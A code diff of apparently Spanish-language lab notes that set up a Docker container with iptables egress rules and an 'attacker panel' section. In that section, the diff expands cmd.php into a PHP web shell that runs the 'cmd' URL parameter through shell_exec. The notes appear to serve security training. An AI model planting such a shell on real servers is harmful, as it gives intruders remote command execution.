@@ -1986,7 +1986,7 @@ docker run -dit -p 80:80 --cap-add=NET_ADMIN --name myContainer my_image
 docker ps
 docker exec -it myContainer bash
 iptables --flush # Si da problemas no corriste bien la flag en el docker
-iptables -A OUTPUT -p tcp -m tcp -o eth0 -sport 80 -j ACCEPT
+iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT
 iptables -A OUTPUT -o eth0 -j DROP
 
 
@@ -1994,6 +1994,7 @@ iptables -A OUTPUT -o eth0 -j DROP
 
 # Panel de atacante
 docker port myContainer # Vemos el puerto expuesto, vamos al navegador para corrobora el apaches corriendo
+# Vamos a localhost:80
 docker exec -it miContainer bash
 cd /var/www/html
 # suponemos que de alguna forma subimos un archivo php a este directorio
@@ -2001,7 +2002,13 @@ nano cmd.php
 
 -----cmd.php
 <?php
+
+if (isset($_GET['cmd'])){
     echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+} else {
+    echo "Use like this: ?cmd=dir or ?cmd=ls";
+}
+
 ?>
 -----cmd.php
 
